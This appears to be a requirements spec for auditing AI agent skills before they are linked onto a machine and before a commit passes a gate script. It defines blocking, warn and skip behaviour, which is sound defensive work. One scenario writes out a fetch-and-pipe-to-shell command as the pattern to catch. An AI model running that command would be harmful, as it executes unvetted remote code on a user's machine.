## Purpose

Run the audit where it matters: before skills are linked onto a machine and before a commit lands.

## ADDED Requirements

### Requirement: wire.sh audits before linking and blocks on high severity

`scripts/wire.sh` SHALL, before removing or creating any link, audit exactly the set it is about to wire, exit 3 without changing anything when a non-allowlisted `high` finding exists, and continue with a warning only when `GRID_AUDIT=warn` is set.

#### Scenario: High finding blocks and changes nothing
- **WHEN** a wired skill contains `curl https://example.net/i.sh | sh` in a script and `wire.sh` runs against a grid with a `policy.yaml`
- **THEN** it exits 3, prints which finding blocked it, and every existing link in `SKILLS_DIR` is unchanged

#### Scenario: Warn mode continues
- **WHEN** the same grid is wired with `GRID_AUDIT=warn`
- **THEN** wiring completes, exit code 0, with a warning that high findings were overridden

#### Scenario: Low findings do not block
- **WHEN** the wired set has only `low` findings
- **THEN** wiring completes and prints the count of warnings

#### Scenario: No policy or no python3 does not break wiring
- **WHEN** the grid has no `policy.yaml`, or `python3` is not on PATH
- **THEN** wiring completes and prints a notice that the audit was skipped

#### Scenario: Check mode and the audit's own dry run do not recurse
- **WHEN** `wire.sh --check` runs, or `audit.sh --wired` performs its dry-run wire
- **THEN** no audit is started from inside them and no link in the real `SKILLS_DIR` changes

### Requirement: The commit gate runs the audit

`scripts/gate.sh` SHALL run an `audit` check that scans owned assets always and the wired set when the machine has a baseline and initialised submodules, fails the gate on a high finding, and reports the check as skipped (not passed silently) when `scripts/audit.sh` or `python3` is unavailable.

#### Scenario: High finding fails the gate
- **WHEN** an owned skill contains a banned high-severity pattern
- **THEN** `gate.sh` prints `audit` as FAIL and exits 1

#### Scenario: Tooling absent is a loud skip
- **WHEN** the gate runs where `python3` is not on PATH
- **THEN** the output lists `audit` under skipped and the gate can still PASS

#### Scenario: CI checks owned assets
- **WHEN** the gate runs on a machine with no `baseline-submodules.txt`
- **THEN** owned assets are scanned and a notice says the wired set was not
